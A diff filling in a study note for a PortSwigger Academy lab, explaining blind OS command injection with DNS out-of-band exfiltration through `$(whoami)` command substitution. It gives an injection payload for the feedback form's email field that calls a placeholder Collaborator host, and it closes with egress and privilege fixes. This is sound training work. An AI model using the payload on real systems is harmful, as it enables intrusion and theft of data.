@@ -1,39 +1,60 @@
 ---
 title: Blind OS command injection with out-of-band data exfiltration
-date: '2025-06-18'
+date: '2026-07-11'
 tags:
   - PortSwigger
   - lab
   - command-injection
   - walkthrough
-excerpt: >-
-  PortSwigger Web Security Academy lab — Blind OS command injection with
-  out-of-band data exfiltration. Walkthrough with solution, key takeaways, and
-  blind replay exercise.
+excerpt: "Collaborator proves the shell runs. This time the command output itself rides out inside the DNS name."
 type: lab
 category: PortSwigger Academy
 platform: PortSwigger
-difficulty: apprentice
+difficulty: practitioner
 ---
 
 # Lab: Blind OS command injection with out-of-band data exfiltration
 
-## Objective
+The previous lab proved a command ran. This one makes the command talk, and it is the same channel with one idea added: put the output inside the hostname you are already asking the target to resolve.
 
-*Describe the labs objective here*
+## The setup
 
-## Solution Reconstruction
+Feedback form, `email` field, output discarded, no readable write directory. Collaborator is available. The goal is no longer just to see an interaction, it is to recover a value from the target and read it off the interaction.
 
-- [ ] Step 1:
-- [ ] Step 2:
-- [ ] Step 3:
-- [ ] Final payload / exploit:
+## How the vulnerability works
 
-## Key Takeaway
+A DNS lookup carries the name it is asking for. If you can place command output inside that name, the data leaves in the query even though you never read a response. The shell hands you the tool for free: command substitution.
 
-*Write ONE principle I must remember*
+Wrap a command in `$()`, or in backticks, and the shell runs it first, then substitutes its standard output into the surrounding command line. Build the lookup name out of that output and the resolver does the exfiltration for you.
 
-## Next-Day Blind Replay
+## Solving it
 
-- [ ] Solved entirely from memory
-- [ ] Needed to look at: *(write the specific step forgotten)*
+1. Generate a Collaborator payload subdomain, as in the interaction lab.
+2. Inject a command whose output becomes part of the name being resolved:
+
+```
+email=x||nslookup $(whoami).YOUR-COLLABORATOR-SUBDOMAIN||
+```
+
+3. Send the request, then click "Poll now" in Collaborator.
+4. Open the DNS interaction. The queried name is your command output prefixed onto the Collaborator domain, so the value you want is the leftmost label.
+
+## Why that payload works
+
+`$(whoami)` is command substitution. The shell runs `whoami`, takes its standard output, and substitutes it into the command line, so `nslookup` is invoked on a name like `someuser.your-subdomain.collaborator-domain`. The result is now part of a DNS query.
+
+That query travels up the resolver chain to the authoritative name server for the Collaborator domain, which is Burp's, and Burp logs the full name, including your data. One request out, the secret in the log, and nothing in it depends on the application's own response.
+
+Read it exactly as it was queried. The value sits in the first label before the first dot.
+
+## The fix
+
+Fix the injection first, then close the channel. If the host cannot resolve arbitrary external names, this exfiltration path dies even when injection survives, so restrict outbound egress to the destinations the application actually needs. Do not run the service as a privileged user, and log abnormal outbound DNS from application hosts.
+
+<Accordion title="Backticks and shape limits">
+The backtick form and `$(whoami)` are equivalent here, so use whichever the target shell accepts. The real constraint is DNS itself: a label is capped at 63 characters and spaces are not allowed in a hostname. A short value like a username fits cleanly. Longer output, a config file or a directory listing, has to be split across several labels or moved to a protocol that tolerates it. If the label in the interaction looks encoded, decode it before assuming the command failed.
+</Accordion>
+
+<Cloze title="Exfil recall" text="The data leaves through the {{DNS}} lookup. I put the command output in the hostname with {{$(whoami)}} command substitution, and Burp Collaborator records the full queried {{name}}." />
+
+<IdeaNode color="#00dd44" label="Tip">A DNS label is capped at 63 characters. `whoami` fits in one lookup. A longer secret needs chunking across labels or a different protocol, so a truncated-looking interaction is usually the DNS limit, not a broken command.</IdeaNode>
